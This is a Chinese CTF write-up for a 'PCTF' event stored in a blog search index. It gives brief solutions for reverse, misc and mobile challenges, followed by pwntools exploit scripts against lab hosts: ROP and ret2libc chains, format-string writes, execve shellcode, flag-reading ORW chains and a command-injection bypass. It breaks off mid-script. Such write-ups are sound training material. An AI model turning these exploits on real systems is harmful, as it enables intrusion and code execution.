<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PCTF-wp</title>
    <url>/202312/08/PCTF-wp/</url>
    <content><![CDATA[<h1 id="PCTF-WP"><a href="#PCTF-WP" class="headerlink" title="PCTF-WP"></a>PCTF-WP</h1><h6 id="inkey"><a href="#inkey" class="headerlink" title="inkey"></a>inkey</h6><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h3><p>开靶机，通过chrome的开发者工具找到了flag</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="学ida与化学gdb"><a href="#学ida与化学gdb" class="headerlink" title="学ida与化学gdb"></a>学ida与化学gdb</h3><p>把程序拖入ida中即可找到flag</p>
<h3 id="baby-python"><a href="#baby-python" class="headerlink" title="baby_python"></a>baby_python</h3><p>再异或一次即可得到原文</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="string">&#x27;v|qwk@idx_~O!cObuq!!)Oy~dubucdY~w!i111m&#x27;</span></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    b.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;&quot;</span>.join(b)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure></div>

<h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h3><p>也是再异或一次出flag</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">enc = <span class="string">&#x27;EOBDX@LMDQBWVOBWJLM|ZLVQ|BQF|QFBOOZ|HMLT|[LQ^&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="number">0x23</span>),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="原神，启动！"><a href="#原神，启动！" class="headerlink" title="原神，启动！"></a>原神，启动！</h3><p>去米游社找到提瓦特大陆通用文字即可解密</p>
<h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h2><h3 id="find-the-cat"><a href="#find-the-cat" class="headerlink" title="find_the_cat"></a>find_the_cat</h3><p>用android killer进行反编译后在main.activity附近即可找到flag</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>签到题</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> k:</span><br><span class="line">    p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="string">&#x27;28247&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;I am a Pwn master&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="别骂了别骂了"><a href="#别骂了别骂了" class="headerlink" title="别骂了别骂了"></a>别骂了别骂了</h3><p>本题的关键是找到sh字符串，即’$0\x00’</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> k:</span><br><span class="line">    p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="string">&#x27;28255&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./3&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x401267&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x4020d8</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">rdi_addr = <span class="number">0x4012d3</span></span><br><span class="line">system_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(rdi_addr) + p64(sh_addr) + p64(ret_addr) + p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;good luck\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="easy-shellcode"><a href="#easy-shellcode" class="headerlink" title="easy_shellcode"></a>easy_shellcode</h3><p>简单的shellcode</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> k:</span><br><span class="line">    p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="string">&#x27;28970&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./shellcode&#x27;)</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="Simple-fmt"><a href="#Simple-fmt" class="headerlink" title="Simple_fmt"></a>Simple_fmt</h3><p>利用格串漏洞将key改为666</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> k:</span><br><span class="line">    p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="string">&#x27;28257&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b *0x401270&#x27;)</span></span><br><span class="line"></span><br><span class="line">key_addr = <span class="number">0x40408C</span></span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line"><span class="comment"># payload = b&#x27;aaaaaaaa&#x27; + b&#x27;%666c%7$n&#x27; + p64(key_addr)</span></span><br><span class="line">payload = fmtstr_payload(offset,&#123;key_addr:<span class="number">666</span>&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Output something\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="korey’s-shell"><a href="#korey’s-shell" class="headerlink" title="korey’s shell"></a>korey’s shell</h3><p>简单的命令行绕过</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> k:</span><br><span class="line">    p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="string">&#x27;28979&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;korey$:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;PING&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;ip:&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1;/b\&#x27;i\&#x27;n/s\&#x27;h\&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>格串泄露libc和canary，栈溢出ret2libc拿shell</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> k:</span><br><span class="line">    p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="string">&#x27;28814&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./fmt2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x40130A&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Can you bypass these protections?\n&#x27;</span>, <span class="string">b&#x27;%9$p%19$p&#x27;</span>)</span><br><span class="line">recv = p.recv(<span class="number">36</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(recv[:<span class="number">18</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">start_addr = recv[<span class="number">18</span>:<span class="number">32</span>]</span><br><span class="line">start_addr = <span class="built_in">int</span>(start_addr, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(start_addr))</span><br><span class="line">libc_base = start_addr - <span class="number">0x24083</span></span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x401373</span></span><br><span class="line">ret_addr = <span class="number">0x401374</span></span><br><span class="line"><span class="comment"># doit_addr = 0x4012C9</span></span><br><span class="line"><span class="comment"># puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment"># puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment"># payload1 = b&#x27;a&#x27; * 0x28 + p64(canary) + p64(0) + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(doit_addr)</span></span><br><span class="line"><span class="comment"># p.sendlineafter(b&#x27;just do it\n&#x27;, payload1)</span></span><br><span class="line"><span class="comment"># puts_addr = u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xe3afe</span></span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = libc_base + <span class="number">0x001b45bd</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(ret_addr) + p64(rdi_addr) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;just do it\n&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="libc-orw"><a href="#libc-orw" class="headerlink" title="libc-orw"></a>libc-orw</h3><p>先利用puts泄露libc，在用ROP链构造orw</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> k:</span><br><span class="line">    p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="string">&#x27;28282&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line">    gdb.attach(p, <span class="string">&#x27;b *0x401425&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x401493</span></span><br><span class="line">rsi_r15_addr = <span class="number">0x401491</span></span><br><span class="line">flag_addr = <span class="number">0x402008</span></span><br><span class="line">bss_addr = <span class="number">0x404080</span></span><br><span class="line">read_addr = <span class="number">0x4013FD</span></span><br><span class="line">leave_ret = <span class="number">0x401424</span></span><br><span class="line">orw_addr = <span class="number">0x401306</span></span><br><span class="line">main_addr = <span class="number">0x4013A5</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_plt = elf.plt[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;try to open read and write!\n&#x27;</span>, payload1)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># print(hex(puts_addr))</span></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">jmp_rdx = libc_base + <span class="number">0x40781</span></span><br><span class="line">jmp_rbx = libc_base + <span class="number">0x3aacd</span></span><br><span class="line">rsi_addr = libc_base + <span class="number">0x2601f</span></span><br><span class="line">rdx_addr = libc_base + <span class="number">0x142c92</span></span><br><span class="line">rbx_addr = libc_base + <span class="number">0x2fdaf</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(<span class="number">0</span>) + p64(open_plt)</span><br><span class="line">payload2 += p64(rdi_addr) + p64(<span class="number">3</span>) + p64(rsi_addr) + p64(bss_addr) + p64(rdx_addr) + p64(<span class="number">0x100</span>) + p64(read_plt)</span><br><span class="line">payload2 += p64(rdi_addr) + p64(<span class="number">1</span>) + p64(write_plt)</span><br><span class="line"><span class="comment"># payload2 = b&#x27;a&#x27; * 0x28 + p64(rdi_addr) + p64(0) + p64(rsi_addr) + p64(bss_addr + 0x20) + p64(rdx_addr) + p64(0x100) + p64(read_plt)</span></span><br><span class="line"><span class="comment"># payload2 += p64(rbx_addr) + p64(bss_addr + 0x20) + p64(jmp_rbx)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;try to open read and write!\n&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.open(&#x27;./flag&#x27;))</span></span><br><span class="line"><span class="comment"># shellcode += asm(shellcraft.read(3, bss_addr, 0x20))</span></span><br><span class="line"><span class="comment"># shellcode += asm(shellcraft.write(1, bss_addr, 0x20))</span></span><br><span class="line"><span class="comment"># sleep(0.1)</span></span><br><span class="line"><span class="comment"># p.send(shellcode)</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="hard-shellcode"><a href="#hard-shellcode" class="headerlink" title="hard_shellcode"></a>hard_shellcode</h3><p>第一次shellcode限制输入7字节，我选择syscall read，并在rip后读入shellcode，利用orw拿flag</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> k:</span><br><span class="line">    p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="string">&#x27;28322&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./hardshellcode&#x27;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p, &#x27;b *0x600004&#x27;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&#x27;b *$rebase(0x1337)&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./hardshellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Maybe you need to write some compilations\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode1 = <span class="string">b&#x27;\x52\x5E\x0F\x05\x52\xC3\x90&#x27;</span></span><br><span class="line">p.send(shellcode1)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode2 += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode2 += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode2 += shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;\x90\x90\x90\x90&#x27;</span> + asm(shellcode2)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="usc"><a href="#usc" class="headerlink" title="usc"></a>usc</h3><p>先利用write泄露libc，其中用到了csu的gadget，接着ret2libc拿shell</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> k:</span><br><span class="line">    p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="string">&#x27;28373&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./usc&#x27;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p, &#x27;b *0x401247&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./usc&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x4012b3</span></span><br><span class="line">rsi_r15_addr = <span class="number">0x4012b1</span></span><br><span class="line">ret_addr = <span class="number">0x4012B4</span></span><br><span class="line">main_addr = <span class="number">0x4011f8</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(rdi_addr) + p64(<span class="number">1</span>) + p64(rsi_r15_addr) + p64(write_got) + p64(<span class="number">0</span>) + p64(write_plt) + p64(ret_addr) + p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;now how you get the shell??\n&#x27;</span>, payload1)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(rdi_addr) + p64(sh_addr) + p64(ret_addr) + p64(system_addr)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;now how you get the shell??\n&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="magic-login"><a href="#magic-login" class="headerlink" title="magic_login"></a>magic_login</h3><p>多次利用格串，写返回地址，布置栈空间，用one_gadget拿shell</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> k:</span><br><span class="line">    p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="string">&#x27;28319&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwnm&#x27;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p, &#x27;b *0x40128d&#x27;)</span></span><br><span class="line">    <span class="comment"># gdb.attach(p, &#x27;b *0x401297&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwnm&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./mlibc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">addr, offset</span>):</span><br><span class="line">    <span class="keyword">if</span> addr == <span class="number">0</span>:</span><br><span class="line">        payload = (<span class="string">&#x27;%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(offset).encode()).ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = (<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(addr, offset).encode()).ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;addr:&#123;&#125;,offfset:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr), offset))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Welcome&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;login\n&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;password\n&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xE</span> + <span class="string">b&#x27;\x8a\x2c&#x27;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload2 = <span class="string">b&#x27;%8$p%11$p%41$p#&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome&#x27;</span>, payload2)</span><br><span class="line">res = p.recvuntil(<span class="string">b&#x27;#&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># print(res)</span></span><br><span class="line">stack_addr = <span class="built_in">int</span>(res[:<span class="number">14</span>], <span class="number">16</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(res[<span class="number">14</span>:<span class="number">28</span>], <span class="number">16</span>) - <span class="number">0x24083</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_addr:&quot;</span>, <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">onegadget = libc_base + <span class="number">0xe3afe</span></span><br><span class="line">ret_addr = stack_addr - <span class="number">0x8</span></span><br><span class="line">strncmp_got = elf.got[<span class="string">&#x27;strncmp&#x27;</span>]</span><br><span class="line">stack1 = stack_addr + <span class="number">0x18</span></span><br><span class="line">stack2 = stack_addr + <span class="number">0xf8</span></span><br><span class="line">stack3 = <span class="built_in">int</span>(res[<span class="number">30</span>:], <span class="number">16</span>)</span><br><span class="line">stack3 = stack3 - (stack3 &amp; <span class="number">0xff</span>) + (stack_addr &amp; <span class="number">0xff</span>)</span><br><span class="line">stack3_low = stack3 &amp; <span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack1), <span class="built_in">hex</span>(stack2), <span class="built_in">hex</span>(stack3))</span><br><span class="line">offset_stack1, offset_stack2 = <span class="number">13</span>, <span class="number">41</span></span><br><span class="line">offset_stack3 = <span class="built_in">int</span>((stack3 - stack_addr) / <span class="number">8</span> + <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;offset_stack3:&quot;</span>, offset_stack3)</span><br><span class="line"><span class="comment"># 0x7fff616ca940 —▸ 0x7fff616ca9a8 —▸ 0x7fff616cc90d 26</span></span><br><span class="line"><span class="comment"># 0x7fff616ca8c8 —▸ 0x7fff616ca9a8 —▸ 0x7fff616cc90d</span></span><br><span class="line"><span class="comment"># offset_stack1 offset_stack2 1043</span></span><br><span class="line">hack_addr = ret_addr</span><br><span class="line">ret_low = ret_addr &amp; <span class="number">0xff</span></span><br><span class="line">low1 = hack_addr &amp; <span class="number">0xff</span></span><br><span class="line">low2 = hack_addr &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span></span><br><span class="line">low3 = hack_addr &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span></span><br><span class="line">low4 = hack_addr &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span></span><br><span class="line">low5 = hack_addr &gt;&gt; <span class="number">32</span> &amp; <span class="number">0xff</span></span><br><span class="line">low6 = hack_addr &gt;&gt; <span class="number">40</span> &amp; <span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hack_addr:&quot;</span>, <span class="built_in">hex</span>(hack_addr))</span><br><span class="line"></span><br><span 